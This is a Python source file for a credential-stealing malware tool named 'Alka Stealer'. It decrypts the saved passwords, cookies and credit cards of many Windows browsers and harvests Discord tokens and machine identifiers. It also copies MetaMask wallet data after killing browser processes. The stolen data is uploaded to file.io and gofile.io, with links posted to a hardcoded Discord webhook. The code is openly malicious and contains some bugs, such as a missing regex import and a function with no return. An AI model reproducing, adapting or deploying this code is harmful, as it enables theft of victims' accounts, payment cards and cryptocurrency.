
import os, requests, json, base64, sqlite3, shutil
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime

hook = "https://discord.com/api/webhooks/1301549321698807909/D6igy5JfxK6AGVfcuyl2hKwKcD7Vn33137lLljI6C3qOosmyGlp9iC-K_4uJEdXKIyNG"

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'firefox': appdata + '\\Mozilla\\Firefox\\Profiles',
    'opera': appdata + '\\Opera Software\\Opera Stable\\User Data',
    'opera-gx': appdata + '\\Opera Software\\Opera GX Stable\\User Data',
    'pale-moon': appdata + '\\Moonchild Productions\\Pale Moon\\Profiles',
    'waterfox': appdata + '\\Waterfox\\Profiles',
    'slimjet': appdata + '\\Slimjet\\User Data',
    'xchart': appdata + '\\XChart\\User Data',
}



def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass
total_browsers = 0


def save_results(browser_name, data_type, content):
    global total_browsers

    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
    total_browsers += 1

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
    return result


def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


def mainpass():
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
        
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
    
    try:
        os.remove(user+'\\AppData\\Local\\Temp\\Browser')
    except:
        pass
    files = {'file': open(user+'\\AppData\\Local\\Temp\\Browser.zip', 'rb')}
    params = {'expire': 'never'}

    response = requests.post("https://file.io", files=files, params=params).json()
    todo = {
    "avatar_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301704812949147658/giphy-1934121164.gif?ex=67257293&is=67242113&hm=218f658655d08940917fd73da7df57fb186ba77a92ef6e683d326fdf515896f4&",
    "username": "Alka Stealer",
    "embeds": [
        {
            "title": "Password Stealer",
            "fields": [
                {
                    "name": "Download Link",
                    "value": f"`{response['link']}`",
                    "inline": True
                },
                {
                    "name": "Files:",
                    "value": f"`{total_browsers}`",
                    "inline": True
                }
            ],
            "image": {
                "url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301704812949147658/giphy-1934121164.gif?ex=67257293&is=67242113&hm=218f658655d08940917fd73da7df57fb186ba77a92ef6e683d326fdf515896f4&",
                "height": 0,
                "width": 0
            }
        }
    ]
    }
    r = requests.post(hook, json=todo)
                
    try:
        os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
    except:
        pass

def find_tokens():
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(token)

    tokendata = {
    "avatar_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301704812949147658/giphy-1934121164.gif?ex=67257293&is=67242113&hm=218f658655d08940917fd73da7df57fb186ba77a92ef6e683d326fdf515896f4&",
    "username": "Alka Stealer",
    "embeds": [
        {
      "title": "Discord Stealer",
      "fields": [
        {
            "name": "Tokens Found",
            "value": "\n".join(tokens),

        }
 
        ],
      "image": {
                "url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301704812949147658/giphy-1934121164.gif?ex=67257293&is=67242113&hm=218f658655d08940917fd73da7df57fb186ba77a92ef6e683d326fdf515896f4&",
                "height": 0,
                "width": 0
            }
      }
        
    ],
    "image": {
        "url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301704812949147658/giphy-1934121164.gif?ex=67257293&is=67242113&hm=218f658655d08940917fd73da7df57fb186ba77a92ef6e683d326fdf515896f4&",
        "height": 0,
        "width": 0
    }
}
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(hook, data=json.dumps(tokendata), headers=headers)

import requests, wmi, subprocess, psutil, platform, json

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac

def machineinfo():

    mem = psutil.virtual_memory()

    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()

    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    
    reqip = requests.get("https://api.ipify.org/?format=json").json()
              
    mac = get_mac_address()
          
    payload = {
        "embeds": [
            {
                "title": "Machine Info",
                "username": "Alka Stealer",
                "avatar_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301704812949147658/giphy-1934121164.gif?ex=67257293&is=67242113&hm=218f658655d08940917fd73da7df57fb186ba77a92ef6e683d326fdf515896f4&",
                "description": "https://guns.lol/alka_",
                "fields": [
                    {
                        "name": ":computer: PC",
                        "value": f"`{platform.node()}`",
                        "inline": True
                    },
                    {
                        "name": ":desktop: OS:",
                        "value": f"`{platform.platform()}`",
                        "inline": True
                    },
                    {
                        "name": ":wrench: RAM",
                        "value": f"`{mem.total / 1024**3} GB`",
                        "inline": True
                    },
                    {
                        "name": ":pager: GPU",
                        "value": f"`{GPUm}`",
                        "inline": True
                    },
                    {
                        "name": ":zap: CPU",
                        "value": f"`{platform.processor()}`",
                        "inline": True
                    },
                    {
                        "name": ":key: HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": True
                    },
                    {
                        "name": ":label: MAC",
                        "value": f"`{mac}`",
                        "inline": True
                    },
                    {
                        "name": ":crossed_swords: IP",
                        "value": f"`{reqip['ip']}`",
                        "inline": True
                    }
                ]
            }
        ]
    }     

    headers = {
        "Content-Type": "Application/Json"
    }
    requests.post(hook, data=json.dumps(payload), headers=headers)

import os
import requests
import zipfile
from discord_webhook import DiscordWebhook, DiscordEmbed

user = os.path.expanduser("~")

def kill_browser_processes():
    browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe"]
    for browser in browsers:
        os.system(f"taskkill /F /IM {browser} /T")

def get_best_server():
    response = requests.get("https://api.gofile.io/getServer")
    data = response.json()
    if data['status'] == 'ok':
        return data['data']['server']
    else:
        raise Exception("Failed to get a server from Gofile.")

def upload_file_to_gofile(file_path, server):
    upload_url = f"https://{server}.gofile.io/uploadFile"
    with open(file_path, 'rb') as f:
        files = {'file': (os.path.basename(file_path), f)}
        response = requests.post(upload_url, files=files)
    data = response.json()
    if data['status'] == 'ok':
        return data['data']['downloadPage']
    else:
        raise Exception("Failed to upload file to Gofile.")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                f_write.write(f_read.read())

def make(args, brow):
    kill_browser_processes()

    dest_path = os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}")
    zip_path = dest_path + ".zip"
    if os.path.exists(args):
        copy_directory(args, dest_path)

        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(dest_path):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), start=dest_path))

        server = get_best_server()
        download_page = upload_file_to_gofile(zip_path, server)

        webhook = DiscordWebhook(url=hook)
        embed = DiscordEmbed(title="MetaMask Data Backup", description=f"Backup of MetaMask wallet data for {brow}.", color=242424)
        embed.add_embed_field(name="Download Link", value=download_page, inline=False)
        webhook.add_embed(embed)
        webhook.execute()

        os.remove(zip_path)
        for root, dirs, files in os.walk(dest_path, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(dest_path)

def backup_wallets():
    meta_paths = [
        [os.path.join(user, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"), "Edge"],
        [os.path.join(user, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Edge"],
        [os.path.join(user, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Brave"],
        [os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Google"],
        [os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "OperaGX"]
    ]
    for path, browser in meta_paths:
        make(path, browser)

backup_wallets()
